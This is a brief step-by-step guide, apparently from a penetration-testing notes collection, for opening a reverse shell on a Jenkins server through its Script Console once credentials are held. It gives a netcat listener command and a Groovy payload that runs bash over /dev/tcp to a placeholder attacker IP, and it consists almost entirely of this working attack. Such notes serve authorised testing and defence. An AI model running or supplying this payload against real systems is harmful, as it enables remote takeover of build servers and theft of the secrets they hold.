## Reverse Shell on Dashboard

You need to have the credential.

1. **Opening Listener on Your Local Machine**

    ```sh
    nc -lvnp 4444
    ```

2. **Login to Jenkins**

    Access "http://localhost:8080" in browser and login.

3. **Click "Manage Jenkins" -> "Script Console"**

4. **Add the Payload in the Console**

    ```java
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/<Attacker_IP>/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    ```

5. **Click "Run"**

    Then you should get a shell.
